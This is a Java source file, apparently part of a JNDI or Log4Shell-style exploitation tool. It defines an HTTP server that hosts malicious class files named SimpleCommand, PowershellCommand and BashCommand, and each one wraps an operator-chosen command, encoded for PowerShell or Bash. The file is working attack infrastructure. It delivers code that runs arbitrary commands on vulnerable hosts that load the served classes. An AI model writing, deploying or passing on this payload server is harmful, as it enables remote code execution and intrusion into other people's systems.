package org.sec.core.http;

import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.sec.util.EncodeUtil;

import java.net.InetSocketAddress;


public class HttpServer {
    private static final Logger logger = LogManager.getLogger(HttpServer.class);

    public static void start(String cmd, int port) {
        try {
            logger.info("start http server: 0.0.0.0:" + port);
            com.sun.net.httpserver.HttpServer server =
                    com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(port), 0);
            server.createContext("/SimpleCommand.class",
                    new CommandHandler(cmd, "SimpleCommand"));
            server.createContext("/PowershellCommand.class",
                    new CommandHandler(EncodeUtil.getPowershellPayload(cmd), "PowershellCommand"));
            server.createContext("/BashCommand.class",
                    new CommandHandler(EncodeUtil.getBashPayload(cmd), "BashCommand"));
            server.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
